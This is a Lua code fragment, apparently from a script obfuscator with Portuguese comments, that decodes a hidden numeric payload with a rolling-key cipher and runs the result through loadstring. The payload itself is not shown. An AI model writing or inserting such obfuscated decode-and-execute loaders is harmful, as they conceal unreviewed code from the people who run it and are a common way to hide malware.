    local function VM_lll1I(d, k, m)
        local R_0OOI = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_0OOI, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_0OOI)
    end

    -- Execution Guard
    local F_1llIO0II = loadstring(VM_lll1I(B_I0I1, 81, 5))
    if F_1llIO0II then
        F_1llIO0II(...)
    end
